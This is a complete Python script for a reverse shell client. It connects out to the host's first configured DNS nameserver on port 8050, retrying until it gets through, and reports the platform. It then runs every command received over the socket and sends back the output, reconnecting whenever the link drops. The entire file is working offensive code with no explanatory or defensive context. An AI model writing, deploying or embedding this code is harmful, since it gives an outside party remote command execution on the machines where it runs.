#!/usr/bin/python3
import socket, platform, dns.resolver, subprocess
dns_resolver = dns.resolver.Resolver()
host = dns_resolver.nameservers[0]
port = 8050
exiting = False
obj = socket.socket()

error = True
while error and not exiting:
    try:
        obj.connect((host, port))
        error = False
        obj.send(bytes(f'Connected: {platform.platform()}'.encode()))
    except KeyboardInterrupt:
        obj.close()
        exiting = True
    except:
        error = True

while not exiting:
    try:
        cmd = obj.recv(1024)
    except KeyboardInterrupt:
        cmd = ''
        obj.close()
        exiting = True
    except ConnectionResetError:
        cmd = ''
        obj.close()
    if cmd:
        cmd = str(cmd)[2:-1]
        try:
            obj.send(subprocess.check_output(cmd.split()))
        except:
            obj.send(bytes(f'Error executing "{cmd}"'.encode()))
    else:
        obj.close()
        error = True
        while error and not exiting:
            try:
                obj = socket.socket()
                obj.connect((host, port))
                error = False
                obj.send(bytes(f'Connected: {platform.platform()}'.encode()))
            except KeyboardInterrupt:
                obj.close()
                exiting = True
            except:
                error = True

obj.close()
